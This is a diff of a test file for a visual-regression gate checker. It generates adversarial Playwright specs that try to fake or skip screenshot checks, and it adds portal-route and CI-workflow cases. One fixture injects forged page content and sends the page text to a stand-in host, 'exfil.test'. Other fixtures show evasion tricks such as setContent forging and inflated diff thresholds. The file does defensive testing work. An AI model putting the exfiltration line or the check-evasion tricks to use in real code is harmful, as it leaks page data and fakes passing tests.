@@ -77,105 +77,121 @@ function visualSpec(
   await page.route("**/api/**", async (route) => { await route.fulfill({ status: 200 }); });
 }`;
   const tests = screens
-    .map(({ test: testName, screenshot, applicationRoute, inventoryRoute }) => {
-      const applicationPath = applicationRoute.replace(
-        /\$[A-Za-z0-9_]+/gu,
-        "sample",
-      );
-      const routeState = inventoryRoute
-        ? new URL(inventoryRoute, "http://visual.invalid").search
-        : "";
-      const navigation =
-        testName === wrongRouteFor
-          ? "/agent/inbox"
-          : `${applicationPath}${testName === wrongQueryFor ? "?layout=board" : routeState}`;
-      const screenshotEvidence =
-        testName === omitScreenshotFor
-          ? ""
-          : testName === nestedScreenshotFor
-            ? `const unused = () => expect(page).toHaveScreenshot(${JSON.stringify(screenshot)});`
-            : testName === locatorScreenshotFor
-              ? `await expect(page.getByText("screen ready")).toHaveScreenshot(${JSON.stringify(screenshot)}, SCREENSHOT_OPTIONS);`
-              : testName === viewportScreenshotFor
-                ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: false });`
-                : testName === mutateScreenshotOptionsFor
-                  ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, SCREENSHOT_OPTIONS);`
-                  : testName === excessiveInlineThresholdFor
-                    ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 100000000, threshold: 0, includeAA: true });`
-                    : `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true });`;
-      const additionalNavigation =
-        testName === additionalNavigationFor ? "await page.goto(target);" : "";
-      const additionalVisualOperation =
-        testName === additionalVisualOperationFor
-          ? (additionalVisualOperationCode ??
-            "const root = page.locator(\"#storybook-root\"); await root.evaluateHandle(\"() => { document.body.innerHTML = '<main>forged</main>'; fetch('https://exfil.test/?x=' + document.body.innerText); }\");")
+    .map(
+      ({
+        test: testName,
+        screenshot,
+        applicationRoute,
+        inventoryRoute,
+        origin,
+      }) => {
+        const applicationPath = applicationRoute.replace(
+          /\$[A-Za-z0-9_]+/gu,
+          "sample",
+        );
+        const routeState = inventoryRoute
+          ? new URL(inventoryRoute, "http://visual.invalid").search.replace(
+              /\{[^{}]+\}/gu,
+              "sample",
+            )
           : "";
-      const targetDeclaration =
-        testName === additionalNavigationFor
-          ? 'const target = "/agent/inbox";'
-          : "";
-      const nestedNavigation =
-        testName === nestedNavigationFor
-          ? "if (true) { await page.goto('/'); }"
-          : "";
-      const helperNavigation =
-        testName === helperNavigationFor
-          ? "await navigateElsewhere(page);"
-          : "";
-      const earlyReturn =
-        testName === earlyReturnFor ? "if (process.env.CI) return;" : "";
-      const setContent =
-        testName === setContentAfterNavigationFor
-          ? 'await page.setContent("<main>pretend screen</main>");'
-          : "";
-      const mutationInVisibility =
-        testName === mutationInVisibilityFor
-          ? 'await expect((page.setContent("<main>pretend screen</main>"), document.write("<main>pretend screen</main>"), page.getByText("screen ready"))).toBeVisible();'
-          : "";
-      const documentIntercept =
-        testName === documentInterceptFor
-          ? 'await page.route("**/*", (route) => route.fulfill({ body: "<main>pretend screen</main>" }));'
-          : "";
-      const setContentInApiRoute =
-        testName === setContentInApiRouteFor
-          ? 'await page.route("**/api/**", async (route) => { await page.setContent("<main>pretend screen</main>"); await route.fulfill({ status: 200 }); });'
-          : "";
-      const computedTaggedSetContentInApiRoute =
-        testName === computedTaggedSetContentInApiRouteFor
-          ? 'await page.route("**/api/**", async (route) => { await aliasedPage["setContent"]`<main>pretend screen</main>`; await route.fulfill({ status: 200 }); });'
-          : "";
-      const shadowedSettleHelper =
-        testName === shadowedSettleHelperFor
-          ? 'const settleVisuals = async (page) => page.setContent("<main>pretend screen</main>");'
-          : "";
-      const shadowedFixtureHelper =
-        testName === shadowedFixtureHelperFor
-          ? 'const installAuthenticatedFixture = async (page) => page.setContent("<main>pretend screen</main>");'
-          : "";
-      const shadowedPageBinding =
-        testName === shadowedPageBindingFor ? "{ const page = {}; }" : "";
-      const useShadowedSettleHelper =
-        testName === shadowedSettleHelperFor
-          ? "await settleVisuals(page);"
-          : "";
-      const enrollmentReadiness =
-        testName === enrollmentReadinessFor
-          ? 'await page.locator("#factor-password").fill("visual-enrollment-password"); await expect(page.getByRole("button", { name: "Set up authenticator" })).toBeEnabled();'
-          : testName === invalidEnrollmentReadinessFor
-            ? 'await page.locator("#other-password").fill("visual-enrollment-password"); await expect(page.getByRole("button", { name: "Set up authenticator" })).toBeEnabled();'
+        const routePath = `${applicationPath}${testName === wrongQueryFor ? "?layout=board" : routeState}`;
+        const navigation =
+          testName === wrongRouteFor
+            ? "/agent/inbox"
+            : origin === "portal"
+              ? `http://127.0.0.1:4179${routePath}`
+              : routePath;
+        const screenshotEvidence =
+          testName === omitScreenshotFor
+            ? ""
+            : testName === nestedScreenshotFor
+              ? `const unused = () => expect(page).toHaveScreenshot(${JSON.stringify(screenshot)});`
+              : testName === locatorScreenshotFor
+                ? `await expect(page.getByText("screen ready")).toHaveScreenshot(${JSON.stringify(screenshot)}, SCREENSHOT_OPTIONS);`
+                : testName === viewportScreenshotFor
+                  ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: false });`
+                  : testName === mutateScreenshotOptionsFor
+                    ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, SCREENSHOT_OPTIONS);`
+                    : testName === excessiveInlineThresholdFor
+                      ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 100000000, threshold: 0, includeAA: true });`
+                      : `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true });`;
+        const additionalNavigation =
+          testName === additionalNavigationFor
+            ? "await page.goto(target);"
             : "";
-      const beforeNavigation =
-        testName === screenshotBeforeNavigationFor
-          ? `${screenshotEvidence} `
-          : "";
-      const afterNavigation =
-        testName === screenshotBeforeNavigationFor ? "" : screenshotEvidence;
-      return `test(${JSON.stringify(testName)}, async ({ page, page: aliasedPage }) => { ${
-        testName === disabledFor
-          ? 'if (process.env.CI) test.fixme(true, "known issue");'
-          : ""
-      } ${testName === computedSkipFor ? 'test["skip"](true, "temporarily disabled");' : ""} ${targetDeclaration} ${documentIntercept} ${setContentInApiRoute} ${computedTaggedSetContentInApiRoute} ${shadowedFixtureHelper} await installAuthenticatedFixture(page); ${shadowedPageBinding} ${beforeNavigation}await page.goto(${JSON.stringify(navigation)}); ${earlyReturn} ${setContent} ${additionalNavigation} ${additionalVisualOperation} ${nestedNavigation} ${helperNavigation} ${enrollmentReadiness} ${mutationInVisibility} ${testName === mutationInVisibilityFor ? "" : 'await expect(page.getByText("screen ready")).toBeVisible();'} ${shadowedSettleHelper} ${useShadowedSettleHelper} ${afterNavigation} });`;
-    })
+        const additionalVisualOperation =
+          testName === additionalVisualOperationFor
+            ? (additionalVisualOperationCode ??
+              "const root = page.locator(\"#storybook-root\"); await root.evaluateHandle(\"() => { document.body.innerHTML = '<main>forged</main>'; fetch('https://exfil.test/?x=' + document.body.innerText); }\");")
+            : "";
+        const targetDeclaration =
+          testName === additionalNavigationFor
+            ? 'const target = "/agent/inbox";'
+            : "";
+        const nestedNavigation =
+          testName === nestedNavigationFor
+            ? "if (true) { await page.goto('/'); }"
+            : "";
+        const helperNavigation =
+          testName === helperNavigationFor
+            ? "await navigateElsewhere(page);"
+            : "";
+        const earlyReturn =
+          testName === earlyReturnFor ? "if (process.env.CI) return;" : "";
+        const setContent =
+          testName === setContentAfterNavigationFor
+            ? 'await page.setContent("<main>pretend screen</main>");'
+            : "";
+        const mutationInVisibility =
+          testName === mutationInVisibilityFor
+            ? 'await expect((page.setContent("<main>pretend screen</main>"), document.write("<main>pretend screen</main>"), page.getByText("screen ready"))).toBeVisible();'
+            : "";
+        const documentIntercept =
+          testName === documentInterceptFor
+            ? 'await page.route("**/*", (route) => route.fulfill({ body: "<main>pretend screen</main>" }));'
+            : "";
+        const setContentInApiRoute =
+          testName === setContentInApiRouteFor
+            ? 'await page.route("**/api/**", async (route) => { await page.setContent("<main>pretend screen</main>"); await route.fulfill({ status: 200 }); });'
+            : "";
+        const computedTaggedSetContentInApiRoute =
+          testName === computedTaggedSetContentInApiRouteFor
+            ? 'await page.route("**/api/**", async (route) => { await aliasedPage["setContent"]`<main>pretend screen</main>`; await route.fulfill({ status: 200 }); });'
+            : "";
+        const shadowedSettleHelper =
+          testName === shadowedSettleHelperFor
+            ? 'const settleVisuals = async (page) => page.setContent("<main>pretend screen</main>");'
+            : "";
+        const shadowedFixtureHelper =
+          testName === shadowedFixtureHelperFor
+            ? 'const installAuthenticatedFixture = async (page) => page.setContent("<main>pretend screen</main>");'
+            : "";
+        const shadowedPageBinding =
+          testName === shadowedPageBindingFor ? "{ const page = {}; }" : "";
+        const useShadowedSettleHelper =
+          testName === shadowedSettleHelperFor
+            ? "await settleVisuals(page);"
+            : "";
+        const enrollmentReadiness =
+          testName === enrollmentReadinessFor
+            ? 'await page.locator("#factor-password").fill("visual-enrollment-password"); await expect(page.getByRole("button", { name: "Set up authenticator" })).toBeEnabled();'
+            : testName === invalidEnrollmentReadinessFor
+              ? 'await page.locator("#other-password").fill("visual-enrollment-password"); await expect(page.getByRole("button", { name: "Set up authenticator" })).toBeEnabled();'
+              : "";
+        const beforeNavigation =
+          testName === screenshotBeforeNavigationFor
+            ? `${screenshotEvidence} `
+            : "";
+        const afterNavigation =
+          testName === screenshotBeforeNavigationFor ? "" : screenshotEvidence;
+        return `test(${JSON.stringify(testName)}, async ({ page, page: aliasedPage }) => { ${
+          testName === disabledFor
+            ? 'if (process.env.CI) test.fixme(true, "known issue");'
+            : ""
+        } ${testName === computedSkipFor ? 'test["skip"](true, "temporarily disabled");' : ""} ${targetDeclaration} ${documentIntercept} ${setContentInApiRoute} ${computedTaggedSetContentInApiRoute} ${shadowedFixtureHelper} await installAuthenticatedFixture(page); ${shadowedPageBinding} ${beforeNavigation}await page.goto(${JSON.stringify(navigation)}); ${earlyReturn} ${setContent} ${additionalNavigation} ${additionalVisualOperation} ${nestedNavigation} ${helperNavigation} ${enrollmentReadiness} ${mutationInVisibility} ${testName === mutationInVisibilityFor ? "" : 'await expect(page.getByText("screen ready")).toBeVisible();'} ${shadowedSettleHelper} ${useShadowedSettleHelper} ${afterNavigation} });`;
+      },
+    )
     .join("\n");
   const testImport = fakeTestBinding
     ? 'import { expect, test as playwrightTest, type Page } from "@playwright/test";\nconst test = (_title, _callback) => {};'
@@ -393,7 +409,18 @@ async function runVisualScope({
 
   write(dir, "docs/02-design/screen-inventory.md", inventory);
   write(dir, "apps/web/src/routeTree.agent.gen.ts", routeTree(routes));
-  write(dir, "apps/web/src/routeTree.portal.gen.ts", routeTree(["/"]));
+  write(
+    dir,
+    "apps/web/src/routeTree.portal.gen.ts",
+    routeTree([
+      ...new Set([
+        "/",
+        ...screens
+          .filter(({ origin }) => origin === "portal")
+          .map(({ applicationRoute }) => applicationRoute),
+      ]),
+    ]),
+  );
   write(dir, "apps/web/e2e/visual-screens.json", JSON.stringify(screens));
   write(
     dir,
@@ -460,6 +487,47 @@ test("G8 requires baselines for active routes and leaves not-started routes plan
   assert.match(
     result.output,
     /2 screenshot cases, 2 active inventory route rows mapped \(3 route rows total\)/,
+  );
+});
+
+test("G8 maps portal-origin pages by their actual route and selection state", async () => {
+  const portalScreens = [
+    {
+      name: "portal-catalogue",
+      inventoryRoute: "/catalogue?q=no-match&key=access",
+      applicationRoute: "/catalogue",
+      origin: "portal",
+      test: "portal catalogue @visual",
+      screenshot: "portal-catalogue.png",
+    },
+    {
+      name: "portal-submission",
+      inventoryRoute: "/submissions/{ref}",
+      applicationRoute: "/submissions/$ref",
+      origin: "portal",
+      test: "portal submission @visual",
+      screenshot: "portal-submission.png",
+    },
+  ];
+  const inventory = [
+    "| Screen | Route | Kind | Stage | Status |",
+    "| --- | --- | --- | --- | --- |",
+    ...portalScreens.map(
+      ({ name, inventoryRoute }) =>
+        `| ${name} | \`${inventoryRoute}\` | route | P3 | 🟡 |`,
+    ),
+  ].join("\n");
+  const result = await runVisualScope({
+    screens: portalScreens,
+    routes: [],
+    inventory,
+    source: visualSpec(portalScreens),
+  });
+
+  assert.equal(result.status, 0, result.output);
+  assert.match(
+    result.output,
+    /2 screenshot cases, 2 active inventory route rows mapped/,
   );
 });
 
@@ -1070,6 +1138,29 @@ test("G8 rejects a CI workflow that no longer invokes the visual test entry poin
   const ciWorkflow = original.replace(
     "run: pnpm test:visual",
     "run: echo skipped",
+  );
+  const result = await runVisualScope({ ciWorkflow });
+
+  assert.notEqual(result.status, 0);
+  assert.match(
+    result.output,
+    /ci-full\.yml must run pnpm test:visual exactly once in one failure-propagating/,
+  );
+});
+
+test("G8 rejects permissions-only preparation that omits web workspace dependency outputs", async () => {
+  const original = await readFile(
+    path.join(repoRoot, ".github/workflows/ci-full.yml"),
+    "utf8",
+  );
+  const ciWorkflow = original.replace(
+    "run: pnpm build --filter=@taskdesk/web... --force",
+    "run: pnpm --filter @taskdesk/permissions build",
+  );
+  assert.notEqual(
+    ciWorkflow,
+    original,
+    "the negative fixture could not find the canonical web dependency graph command",
   );
   const result = await runVisualScope({ ciWorkflow });
 
